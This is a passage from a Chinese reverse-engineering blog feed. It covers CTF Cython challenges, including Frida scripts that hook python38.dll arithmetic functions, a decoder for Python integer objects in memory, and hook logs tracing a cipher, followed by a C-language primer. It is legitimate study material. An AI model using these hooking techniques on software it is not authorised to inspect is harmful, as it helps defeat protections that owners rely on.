class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>&amp; Arr::<span class="keyword">operator</span>[](<span class="type">unsigned</span> i)</span><br><span class="line">&#123;</span><br><span class="line">i = (i + size) % size;</span><br><span class="line">i = i &gt;= <span class="number">0</span> ? i : (i + size);</span><br><span class="line"><span class="keyword">return</span> arr[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::begin</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::end</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr + size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> Arr&amp; obj)</span><br><span class="line">&#123;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;len: &quot;</span> &lt;&lt; obj.<span class="built_in">getsize</span>() &lt;&lt; std::endl;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;element list:&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> i : obj) &#123;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::uppercase &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>我一开始是想使用frida和python setattr一起搞的，最后失败了QAQ。<br>我现在在想，会不会对于那些语言形成的混淆，其实可以用语言本身的特性去解决，至少对于解释型语言似乎重点都在混淆里面，那么对于Java的so文件，似乎也可以这样？如果加密是传入一个byte[]类型，那我继承byte生成自己的类传进去，似乎就没有问题了。</p><p>再往编译型语言看看，像rust，go似乎都是直接看汇编比看ida反编译的更好。但是如果他们写成dll似乎也可以被我们主动触发。而剩下的exe类型，还是直接让之后专门的反编译器来解决吧。</p><p>我觉得像这种语言层面的混淆，会随着语言变多/发展而愈来愈多，所以我觉得深入研究某个语言的内容是不划算的（除非专门研究某个语言的逆向，但是这样也可能遇到很多不开源的框架，对于框架来说，我们也很难分析）。那么对于这些内容，我们为了理清逻辑，更应该使用通解：HOOK？来获取具体流程。</p><hr><p>关于我一开始的方法：frida_hook py38.dll的运算函数</p><p>hook到的永远是一个地址，且如果先传给python再解引用会导致一些bug，frida直接解引用也会导致bug。</p><p>所以还是要看一下具体的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> &#123;</span><span class="comment">//定长类型</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">&#125; PyObject;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">//变长类型</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">&#125; PyVarObject;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">//float为定长类型</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    <span class="type">double</span> ob_fval;</span><br><span class="line">&#125; PyFloatObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PyLongValue</span> &#123;</span><span class="comment">//int为变长类型</span></span><br><span class="line">    <span class="type">uintptr_t</span> lv_tag; <span class="comment">/* Number of digits, sign and flags */</span></span><br><span class="line">    digit ob_digit[<span class="number">1</span>];</span><br><span class="line">&#125; _PyLongValue;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">longobject</span> &#123;</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    _PyLongValue long_value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://www.thinkinpython.com/post/deep_py_vm_3.html">3. Object 的基本结构 - Think In Python</a></p><p><a href="https://github.com/python/cpython/blob/main/Include/cpython/longintrepr.h#L98">cpython/Include/cpython/longintrepr.h at main · python/cpython (github.com)</a></p><p>根据如上去查找PyObject_HEAD，发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PyObject_HEAD                   PyObject ob_base;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> &#123;</span></span><br><span class="line">    _PyObject_HEAD_EXTRA</span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">ob_type</span>;</span></span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure><p>其中_PyObject_HEAD_EXTRA被定义为NULL，Py_ssize_t为int64，struct _typeobject *是指针也为64<br>所以这里有16字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PyLongValue</span> &#123;</span></span><br><span class="line">    <span class="type">uintptr_t</span> lv_tag; <span class="comment">/* Number of digits, sign and flags */</span></span><br><span class="line">    digit ob_digit[<span class="number">1</span>];</span><br><span class="line">&#125; _PyLongValue;</span><br></pre></td></tr></table></figure><p>lv_tag保存了</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">低2位：符号信息：0：正数，1：0，2：<span class="string">-1</span></span><br><span class="line">第三低位：保留</span><br><span class="line">之前的：保存长整数中数字的个数，ndigits = lv_tag &gt;&gt; 3（64位中为(1&lt;&lt;61)<span class="string">-1</span>）</span><br></pre></td></tr></table></figure><p>ob_digit为数组，存放无符号整型，会放30位内容进去，作为值</p><p><a href="https://www.cnblogs.com/ChangAn223/p/11495690.html">Python 3 的 int 类型详解（为什么 int 不存在溢出问题？） - 长安223 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.thinkinpython.com/post/deep_python_4.html">4. Long Object 初探 - Think In Python</a></p><p>那么我们可以直接使用以下转换函数来转换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getNumber</span>(<span class="params">Nptr</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> ps = <span class="title class_">Process</span>.<span class="property">pointerSize</span></span><br><span class="line">    <span class="keyword">let</span> shift = ps == <span class="number">8</span>? <span class="number">30</span>:<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">let</span> length = <span class="title class_">Nptr</span>.<span class="title function_">add</span>(<span class="number">0x10</span>).<span class="title function_">readPointer</span>().<span class="title function_">toInt32</span>();</span><br><span class="line">    <span class="keyword">let</span> number = <span class="title function_">ptr</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> this_block = <span class="title function_">ptr</span>(<span class="title class_">Nptr</span>.<span class="title function_">add</span>(<span class="number">0x18</span>+i*(ps/<span class="number">2</span>)).<span class="title function_">readU32</span>())</span><br><span class="line">        number = number.<span class="title function_">or</span>(this_block.<span class="title function_">shl</span>(shift*i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据测试，这个可以hook出正确的值，但是乘法不对，似乎和底层实现有关，QAQ有没有佬教教我</p><p>hook出的每轮的值</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_And</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x9e3779ce&#x27;</span>, <span class="string">&#x27;0xffffffff&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_And</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x9e3779ce</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x13c6ef39&#x27;</span>, <span class="string">&#x27;0x10&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x13c6ef29</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x0&#x27;</span>, <span class="string">&#x27;0x278dde738&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x278dde738</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x13c6ef29&#x27;</span>, <span class="string">&#x27;0x278dde738&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x28ca4d661</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x2&#x27;</span>, <span class="string">&#x27;0x9e3779b9&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x9e3779bb</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x0&#x27;</span>, <span class="string">&#x27;0x3&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x3</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x31&#x27;</span>, <span class="string">&#x27;0x9e3779ce&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x9e3779ff</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x9e3779bb&#x27;</span>, <span class="string">&#x27;0x9e3779ff&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x13c6ef3ba</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x28ca4d661&#x27;</span>, <span class="string">&#x27;0x13c6ef3ba&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Xor</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x3b0ca25db</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x5&#x27;</span>, <span class="string">&#x27;0x3b0ca25db&#x27;</span>]</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_Add</span> <span class="selector-tag">returned</span>: <span class="number">0</span><span class="selector-tag">x3b0ca25e0</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Function</span> <span class="selector-tag">PyNumber_And</span> <span class="selector-tag">called</span> <span class="selector-tag">with</span> <span class="selector-tag">arguments</span>: <span class="selector-attr">[<span class="string">&#x27;0x3b0ca25e0&#x27;</span>, <span class="string">&#x27;0xffffffff&#x27;</span>]</span></span><br></pre></td></tr></table></figure><p>感觉还是很对的。</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> 知识集 </category>
          
          <category> CTF </category>
          
          <category> 逆向 </category>
          
          <category> 比赛 </category>
          
          <category> 语言 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cython学习</title>
      <link href="/posts/98181542.html"/>
      <url>/posts/98181542.html</url>
      
        <content type="html"><![CDATA[<p>怎么最近这么多Cython的题，做起来好痛苦。而且这种题还是那种很好出，但是不好逆的。当然，也就是暂时了。但凡有佬研究清楚结构，都可以搞个反编译器出来直接秒。不过好像就连rust，go这种都没有专门的反编译器，可能就还早了。。。</p><p>这次SCTF，某出题人叫我试试他出的题，然后就被恶心到了。</p><p>我本身是不喜欢去研究那些什么结构之类的东西，因为不一样的格式太多了，每个都研究显然是不高效的，我想找到一个可能的通解去研究某些问题</p><p>因为这不是python系列的第一篇了，所以这里只说一下我想的新方法。</p><h2 id="Cython">Cython</h2><p><a href="https://blog.csdn.net/MOU_IT/article/details/81876879">cython是什么-CSDN博客</a></p><p>Cython是一个语言：完全包含python语言和部分包含C语言和魔改C语言的集合。它由python实现用于写python模块。文件后缀是pyx，它的作用在于提高python的速度，编译过程：pyx-&gt;c-&gt;pyd/so（分别为Windows，linux）</p><p>可以尝试自写一个pyx文件生成pyd后用ida打开pyd文件，发现内容和原来的内容已经截然不同，可以说根本没有辨识度，极难分析。但是可以发现pyd都调用了python.dll的函数，其中所有运算符都在其中有对应的函数。我在想是不是可以通过这个方法来得到pyd的执行流程。</p><h2 id="Hook，启动！">Hook，启动！</h2><p>frida：挂钩时间在python层hook后第一次执行hook函数。好像不能全部hook，所以只hook基本运算函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> functionsToHook = [</span><br><span class="line">    <span class="string">&quot;PyNumber_Add&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Subtract&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Multiply&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_TrueDivide&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Or&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Xor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_And&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Lshift&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyNumber_Rshift&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PyObject_GetItem&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">functionsToHook.<span class="title function_">forEach</span>(<span class="function"><span class="params">functionName</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;python38.dll&quot;</span>, functionName), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> argsArray = [];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                argsArray.<span class="title function_">push</span>(args[<span class="number">0</span>]); </span><br><span class="line">                argsArray.<span class="title function_">push</span>(args[<span class="number">1</span>]); </span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Error reading arguments: <span class="subst">$&#123;e&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(argsArray);</span><br><span class="line">            <span class="title function_">send</span>(&#123; <span class="attr">function</span>: functionName, <span class="attr">arguments</span>: argsArray &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="title function_">send</span>(&#123; <span class="attr">function</span>: functionName, <span class="attr">returnValue</span>: retval &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后测试，结果失败了。QAQ因为这些函数的传参和传出都是python的值对象。所以要找个方法去解析那些对象。以及最后的比较不知道是什么函数，要知道最后的密文需要hook这个函数。</p><p>尝试先使用ida动调python，看看里面的值对象的空间是怎么样的。</p><hr><p><a href="https://xz.aliyun.com/t/16155?time__1311=GuD%3D7Iqmxfhx%2FD0lD2DUoEtW9K7Txita4D">https://xz.aliyun.com/t/16155?time__1311=GuD%3D7Iqmxfhx%2FD0lD2DUoEtW9K7Txita4D</a></p><p>这个是孤恒师傅在先知社区里写的Cython相关知识点。（催更！）</p><h2 id="编译">编译</h2><p>Cython：将python内容编译为pyd文件，pyd类似于DLL，都是静态的，通过调用python.dll的函数实现自己的运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">from</span> Cython.Build <span class="keyword">import</span> cythonize</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">&#x27;module&#x27;</span>,</span><br><span class="line">    ext_modules=cythonize(</span><br><span class="line">        <span class="string">&quot;module.py&quot;</span>,</span><br><span class="line">        compiler_directives=&#123;<span class="string">&#x27;language_level&#x27;</span>: <span class="string">&quot;3&quot;</span>&#125;,</span><br><span class="line">    ),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>编译类似于这样，执行后，会生成一个.c文件，一个.pyd文件，pyd文件是由c文件编译而来，所以可以通过python源代码和c代码来对照着看相差的内容</p><h2 id="对比">对比</h2><p>类型：</p><p>各个类型的存储都有一个固定的函数去转换，<br>其它可以直接看上面的博客QAQ</p><p>操作：</p><p>控制流很抽象，只要和变量扯上关系就会有奇怪的函数加进来</p><p>比较函数经常使用richCompare，因此要是最后加密逻辑在这里面比较，可以直接hook这个函数来得到密文</p><p>函数：</p><p>函数变为一层包装，每一个函数可以通过直接找函数名的引用来找到位置，查交叉引用时，一个是外层的包装函数，一个是真正的函数，按照顺序编译的话，一般都是上面是外层函数，下面是内层函数，所以直接找下面那个就可以找到真的函数</p><h2 id="调试">调试</h2><p>执行后附加调试python.exe即可</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 语言 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言总结</title>
      <link href="/posts/76cbc618.html"/>
      <url>/posts/76cbc618.html</url>
      
        <content type="html"><![CDATA[<h1>C语言入门</h1><p>本章快速过一遍C语言的知识，同时提供一种从逆向角度看待不同语言的视角。</p><h2 id="0x01-为了实现">0x01 为了实现</h2><p>任何一个语言，均是为了实现一个目的而使用的。任何一个语言，均是为了解决一个痛点而出现的。C正是解决了汇编的繁琐而出现的，它把寄存器和内存的各种操作封装到每个过程的变量之中来简化指令的编写。</p><p>C语言基于面向过程。CPU从程序入口点抽出一条指令，然后执行，再抽出下一个指令，然后再执行，直到程序结束。这就叫过程，一般来说，面向过程的过程也可以叫做函数。一个函数的结束可以说是一个过程的结束。在C语言中也是如此。</p><h2 id="0x02-过程">0x02 过程</h2><h3 id="00-过程的定义">00 过程的定义</h3><p>C语言中，过程的定义就是一个有0或多个输入，0或多个输出的函数。通常来讲，只要是{}大括号包裹的空间，都被视为一个单独的过程，包括后面的循环体，选择体等等。</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个过程是0输入，1输出的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">say</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a+b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个过程是一个2输入，0输出的函数。</p><p>对于一个函数，其主要作用就是返回一个数值，我们叫它返回值，也就是<code>return 0;</code>这个语句，但是还可能有其它效果，比如打印一个字符串到屏幕，这种除了返回一个值的其它效果被叫做<code>副作用</code>。printf的副作用就是输出内容到屏幕，它的返回值就是输出内容成功的个数。C语言中函数的本质就是它的返回值</p><h3 id="01-创建一个过程">01 创建一个过程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a+b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">return_type <span class="title function_">identifier</span><span class="params">(type parameter,...)</span>&#123;</span><br><span class="line">    <span class="comment">//function body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个过程（在C语言中的函数）需要返回类型，过程名，传入参数和函数体。</p><p>上面的例子标识了函数如何定义。</p><ul><li><code>return_type</code> 表示返回值的类型(具体见0x03)</li><li><code>identifier</code> 是你为这个函数标识的名字（标识符）</li><li><code>type parameter</code> 即括号中的内容是传入的参数类型和传入值的标识符，如果没有，可以填void，标识为空(具体见0x03)</li><li><code>function body</code> 函数体，你会在这里写这个过程需要干什么，就像上面的main函数一样</li></ul><p>值得一提的是：每个C语言程序都需要一个main函数作为用户自定义过程的入口点。也就是说，当用户打开一个C程序，CPU从start函数（自动生成的）开始初始化所有需要的环境，成功后，自动调用main函数从而执行用户自定义的过程，main函数结束后，再自动回收/清理环境内容然后结束程序。</p><h3 id="02-调用一个过程">02 调用一个过程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a+b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> c = add(a,b);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span 